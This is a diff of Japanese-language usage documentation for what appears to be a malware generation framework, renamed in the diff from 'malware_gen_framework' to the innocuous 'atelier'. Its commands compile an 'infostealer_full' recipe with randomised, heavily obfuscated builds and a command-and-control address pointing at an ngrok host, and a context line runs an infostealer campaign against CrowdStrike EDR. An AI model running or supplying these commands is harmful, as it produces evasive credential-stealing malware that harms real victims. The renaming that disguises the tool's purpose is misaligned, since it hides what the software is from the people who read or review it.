@@ -490,20 +490,20 @@ results/chunk_infostealer_20260715_221129/
 
 ```bash
 # 基本的なアセンブル + コンパイル
-python -m malware_gen_framework chunk --recipe infostealer_full --compile
+python -m atelier chunk --recipe infostealer_full --compile
 
 # ランダマイズ有効（毎回異なるバイナリ）
-python -m malware_gen_framework chunk --recipe infostealer_full --compile --randomize
+python -m atelier chunk --recipe infostealer_full --compile --randomize
 
 # 難読化レベル指定
-python -m malware_gen_framework chunk --recipe infostealer_full --compile --obfuscate heavy
+python -m atelier chunk --recipe infostealer_full --compile --obfuscate heavy
 
 # 変数のオーバーライド
-python -m malware_gen_framework chunk --recipe infostealer_full --compile \
+python -m atelier chunk --recipe infostealer_full --compile \
     --var C2_IP=0.tcp.jp.ngrok.io --var C2_PORT=22301
 
 # コンパイラ指定（MinGW または Zig）
-python -m malware_gen_framework chunk --recipe infostealer_full --compile --compiler zig
+python -m atelier chunk --recipe infostealer_full --compile --compiler zig
 ```
 
 ### Hermesキャンペーン
@@ -517,7 +517,7 @@ python -m hermes --edr crowdstrike --malware-type infostealer --max-rounds 50
 
 ```bash
 # ポータル起動（Tailscaleアクセス対応）
-python -m malware_gen_framework portal --port 7070 --host 0.0.0.0
+python -m atelier portal --port 7070 --host 0.0.0.0
 ```
 
 ### スナップショット管理
